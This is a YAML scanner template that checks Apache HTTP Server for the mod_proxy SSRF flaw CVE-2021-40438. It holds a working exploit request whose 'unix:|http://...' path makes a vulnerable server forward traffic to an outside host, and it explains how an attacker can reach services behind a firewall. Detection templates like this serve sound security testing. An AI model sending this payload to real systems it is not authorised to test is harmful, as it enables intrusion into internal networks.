name: Apache HTTP Server SSRF CVE-2021-40438
manual: true
query: (product="Apache-Web-Server"||server="Apache")
transport: http
rules:
  r0:
    request:
      method: GET
      path: /?unix:|http://baidu.com/api/v1/targets
    expression: response.status == 302 && response.raw_header.bcontains(b"http://www.baidu.com/search/error.html")
expression: r0()
detail:
  author: aetkrad
  links:
  - https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-40438#apache-http-server-2448-mod_proxy-ssrf-cve-2021-40438
  description: A Server-Side Request Forgery (SSRF) flaw was found in mod_proxy of
    httpd. This flaw allows a remote, unauthenticated attacker to make the httpd server
    forward requests to an arbitrary server. The attacker could get, modify, or delete
    resources on other services that may be behind a firewall and inaccessible otherwise.
    The impact of this flaw varies based on what services and resources are available
    on the httpd network
  tags: ssrf
